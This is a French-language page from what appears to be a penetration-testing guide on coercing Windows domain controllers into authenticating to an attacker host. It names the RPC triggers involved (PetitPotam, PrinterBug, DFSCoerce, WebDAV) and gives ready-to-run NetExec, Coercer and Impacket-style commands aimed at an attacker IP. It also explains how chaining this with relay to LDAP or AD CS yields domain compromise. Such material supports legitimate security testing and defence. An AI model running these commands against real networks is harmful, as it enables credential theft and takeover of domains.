---
title: "Coercition : forcer les machines privilégiées à s'authentifier"
order: 2
description: "Déclencher à la demande l'authentification depuis des machines Windows, en particulier les contrôleurs de domaine, en invoquant des méthodes RPC et de protocole (PetitPotam/EFSRPC, PrinterBug/MS-RPRN, DFSCoerce et WebDAV) pour alimenter la capture ou le relais."
keywords:
  - coercion
  - PetitPotam
  - PrinterBug
  - DFSCoerce
  - WebDAV
---

# Coercition

L'empoisonnement attend qu'une victime commette une erreur. La **coercition** supprime l'attente : vous appelez une procédure distante sur une cible qui, par conception, la fait se reconnecter et s'authentifier auprès d'un hôte de votre choix. Visant un **contrôleur de domaine**, la coercition produit à la demande l'authentification du compte machine du DC, qui est l'entrée des chaînes de [relais](relay.md) les plus destructrices (relais vers LDAP pour RBCD, ou vers AD CS ESC8 pour un certificat de DC).

## Les déclencheurs

Plusieurs interfaces RPC intégrées peuvent être amenées à s'authentifier vers l'extérieur :

- **PetitPotam (MS-EFSRPC)** : le protocole distant d'Encrypting File System ; `EfsRpcOpenFileRaw` et les appels associés font s'authentifier la cible auprès d'un chemin UNC que vous fournissez. Atteignable même depuis une position non authentifiée sur les hôtes non corrigés, sinon avec n'importe quel compte de domaine.
- **PrinterBug (MS-RPRN)** : le Print System Remote Protocol ; `RpcRemoteFindFirstPrinterChangeNotification` fait se reconnecter le spouleur. Fonctionne partout où le service Print Spooler s'exécute.
- **DFSCoerce (MS-DFSNM)** : l'interface de gestion des espaces de noms du Distributed File System ; force via le service DFS, présent sur les DC.
- **ShadowCoerce (MS-FSRVP)** (service de clichés instantanés) et **CheeseOunce / MS-EVEN** (le journal d'événements distant, `ElfrOpenBELW`) fournissent d'autres méthodes lorsque les plus courantes sont corrigées ou bloquées.

Plutôt que d'en choisir une, parcourez-les toutes. Le module **`coerce_plus` de NetExec** essaie chaque méthode en une seule commande, et **Coercer** fait de même avec le jeu de méthodes le plus large :

```bash
# NetExec: try all coercion methods against the target (checks, then fires at a listener)
nxc smb <dc-ip> -u user -p pass -M coerce_plus -o LISTENER=<attacker-ip>

# Coercer: cycle every known RPC coercion method
coercer coerce -u user -p pass -d example.local -t <dc-ip> -l <attacker-ip>

# Single-method Impacket-style triggers
petitpotam.py -u user -p pass -d example.local <attacker-ip> <dc-ip>   # MS-EFSRPC
printerbug.py example.local/user:pass@<dc-ip> <attacker-ip>            # MS-RPRN
dfscoerce.py -u user -p pass -d example.local <attacker-ip> <dc-ip>    # MS-DFSNM
```

## Choisir le rappel : SMB ou HTTP

Le protocole sur lequel la cible s'authentifie détermine ce que vous pouvez en faire :

- Le **rappel SMB** est le mode par défaut, capturé par Responder ou relayé avec ntlmrelayx, mais le relais SMB vers LDAP est bloqué lorsque la signature est négociée.
- Le **rappel HTTP** est le gain recherché : forcer l'authentification sur **HTTP** (via le client WebDAV, nécessitant le service WebClient sur la cible, qui peut lui-même être démarré à distance) produit une authentification **sans** la signature SMB en travers, permettant le relais vers LDAP (RBCD) et vers AD CS (ESC8). Déclenchez le service WebClient et forcez vers un chemin UNC `http://` ou WebDAV (`\\attacker@80\share`).

## Notes d'exploitation

- La coercition plus le relais vers AD CS **ESC8** contre l'enrôlement HTTP d'un DC produit un certificat pour le compte machine du DC, ce qui est une compromission du domaine, forcer un DC est donc un objectif prioritaire.
- Le service WebClient est la porte de la coercition HTTP ; énumérez-le et démarrez-le à distance (par exemple via un mapping piégé ou `webclientservicescanner`) avant de forcer.
- Même les DC entièrement corrigés peuvent généralement être forcés via *une* interface par un utilisateur authentifié ; la coercition est rarement totalement fermée, seulement restreinte.

## Outils

- **NetExec (`nxc`) `-M coerce_plus`** : parcourir les cinq méthodes depuis une seule commande.
- **Coercer** (p0dalirius) : automatise chaque méthode de coercition connue contre une cible.
- **PetitPotam.py / printerbug.py / dfscoerce.py** (basés sur Impacket) : déclencheurs mono-méthode.
- **webclientservicescanner / PetitPotam `-pipe`** : trouver et démarrer le service WebClient pour la coercition HTTP.

## Références

- [Unit 42: authentication coercion keeps evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Coercer (p0dalirius): coercion method reference](https://github.com/p0dalirius/Coercer)
- [PetitPotam (topotam)](https://github.com/topotam/PetitPotam)
- [Microsoft (MS-EFSR): EfsRpcOpenFileRaw](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8)
